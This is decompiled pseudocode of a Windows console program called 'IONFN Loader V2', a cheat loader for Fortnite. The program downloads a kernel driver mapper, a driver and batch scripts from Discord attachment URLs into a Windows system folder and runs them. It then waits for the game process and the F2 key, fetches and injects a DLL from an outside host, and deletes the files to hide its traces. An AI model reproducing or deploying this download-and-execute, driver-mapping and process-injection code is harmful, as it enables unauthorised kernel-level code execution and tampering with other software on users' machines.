void sub_7FF704149A40()
{
  char *v0; // rdi
  signed __int64 i; // rcx
  __int64 v2; // rax
  int v3; // eax
  __int64 v4; // rdx
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rdx
  __int64 v8; // rdx
  __int64 v9; // rax
  __int64 v10; // rax
  __int64 v11; // rax
  __int64 v12; // rax
  __int64 v13; // rdx
  __int64 v14; // rax
  __int64 v15; // rdx
  __int64 v16; // rdx
  __int64 v17; // rax
  char v18; // [rsp+0h] [rbp-30h]
  __int64 v19; // [rsp+20h] [rbp-10h]
  int v20; // [rsp+28h] [rbp-8h]
  __int64 v21; // [rsp+38h] [rbp+8h]
  __int64 v22; // [rsp+58h] [rbp+28h]
  unsigned int v23; // [rsp+78h] [rbp+48h]
  unsigned int v24; // [rsp+7Ch] [rbp+4Ch]

  v0 = &v18;
  for ( i = 90i64; i; --i )
  {
    *(_DWORD *)v0 = -858993460;
    v0 += 4;
  }
  sub_7FF70414115E(&unk_7FF70415E05A);
  v2 = GetConsoleWindow();
  v21 = v2;
  v3 = GetWindowLongW_0(v2, 4294967280i64);
  SetWindowLongW(v21, 4294967280i64, v3 & 0xFFFAFFFF);
  v22 = GetConsoleWindow();
  GetWindowRect(v22, &v23);
  v20 = 1;
  LODWORD(v19) = 500;
  MoveWindow(v22, v23, v24, 900i64, v19, *(_QWORD *)&v20);
  system("cls");
  SetConsoleTitleA("IONFN Loader V2");
  qword_7FF704158360 = GetStdHandle_0(4294967285i64);
  LOWORD(v4) = 4;
  SetConsoleTextAttribute(qword_7FF704158360, v4);
  v5 = cout(140708752027776i64, "[-] Loading Driver");
  std::basic_ostream<char,std::char_traits<char>>::operator<<(v5, sub_7FF704141212);
  v6 = cout(140708752027776i64, "[>] Status:");
  std::basic_ostream<char,std::char_traits<char>>::operator<<(v6, sub_7FF704141212);
  LOWORD(v7) = 5;
  SetConsoleTextAttribute(qword_7FF704158360, v7);
  j_URLDownloadToFileW_0(
    0i64,
    L"https://cdn.discordapp.com/attachments/748646124696502342/756996836308418730/kdmapper.exe",
    L"C://Windows//apppatch//Custom//Custom64//kdmapper.exe",
    0i64,
    0i64);
  j_URLDownloadToFileW_0(
    0i64,
    L"https://cdn.discordapp.com/attachments/748646124696502342/756990774620455002/driver.sys",
    L"C://Windows//apppatch//Custom//Custom64//driver.sys",
    0i64,
    0i64);
  j_URLDownloadToFileW_0(
    0i64,
    L"https://cdn.discordapp.com/attachments/748646124696502342/756990779456749639/Map.bat",
    L"C://Windows//apppatch//Custom//Custom64//Map.bat",
    0i64,
    0i64);
  system("C://Windows//apppatch//Custom//Custom64//Map.bat");
  Sleep_0(1500i64);
  remove("C://Windows//apppatch//Custom//Custom64//kdmapper.exe");
  remove("C://Windows//apppatch//Custom//Custom64//driver.sys");
  remove("C://Windows//apppatch//Custom//Custom64//Map.bat");
  system("cls");
  qword_7FF704158360 = GetStdHandle_0(4294967285i64);
  LOWORD(v8) = 5;
  SetConsoleTextAttribute(qword_7FF704158360, v8);
  v9 = cout(140708752027776i64, "\n\n\n\t   [+] Waiting for FortniteClient-Win64-Shipping.exe");
  std::basic_ostream<char,std::char_traits<char>>::operator<<(v9, sub_7FF704141212);
  v10 = cout(
          140708752027776i64,
          "           [+] By Problems open a Ticket by ION FN Discord Server! Cheat is updatet every day!");
  std::basic_ostream<char,std::char_traits<char>>::operator<<(v10, sub_7FF704141212);
  do
    Sleep_0(10i64);
  while ( !(unsigned __int8)sub_7FF704141050((__int64)L"FortniteClient-Win64-Shipping.exe") );
  v11 = cout(140708752027776i64, "\tProcess found!");
  std::basic_ostream<char,std::char_traits<char>>::operator<<(v11, sub_7FF704141212);
  v12 = cout(140708752027776i64, "\n\n\tF2 in lobby to Inject!");
  std::basic_ostream<char,std::char_traits<char>>::operator<<(v12, sub_7FF704141212);
  LOWORD(v13) = 4;
  SetConsoleTextAttribute(qword_7FF704158360, v13);
  do
    Sleep_0(10i64);
  while ( !(unsigned __int16)GetAsyncKeyState(0x71i64) );
  v14 = cout(140708752027776i64, "[-] \nInjecting");
  std::basic_ostream<char,std::char_traits<char>>::operator<<(v14, sub_7FF704141212);
  LOWORD(v15) = 15;
  SetConsoleTextAttribute(qword_7FF704158360, v15);
  j_URLDownloadToFileW_0(
    0i64,
    L"https://cdn.discordapp.com/attachments/748646124696502342/756990770359173161/modmap.exe",
    L"C://Windows//apppatch//Custom//Custom64//modmap.exe",
    0i64,
    0i64);
  j_URLDownloadToFileW_0(
    0i64,
    L"https://cdn.discordapp.com/attachments/748646124696502342/756990772863172729/Inject.bat",
    L"C://Windows//apppatch//Custom//Custom64//Inject.bat",
    0i64,
    0i64);
  j_URLDownloadToFileW_0(
    0i64,
    L"http://ion-fn.bplaced.net/dfgujighnjgfnh/Fortnite.dll",
    L"C://Windows//apppatch//Custom//Custom64//Fortnite.dll",
    0i64,
    0i64);
  system("C://Windows//apppatch//Custom//Custom64//Inject.bat");
  system("cls");
  Sleep_0(800i64);
  remove("C://Windows//apppatch//Custom//Custom64//modmap.exe");
  remove("C://Windows//apppatch//Custom//Custom64//Inject.bat");
  remove("C://Windows//apppatch//Custom//Custom64//Fortnite.dll");
  system("cls");
  LOWORD(v16) = 3;
  SetConsoleTextAttribute(qword_7FF704158360, v16);
  v17 = cout(140708752027776i64, "[i] Have fun with ION FN! Exiting in 5 seconds");
  std::basic_ostream<char,std::char_traits<char>>::operator<<(v17, sub_7FF704141212);
  Sleep_0(5000i64);
  exit(1i64);
}
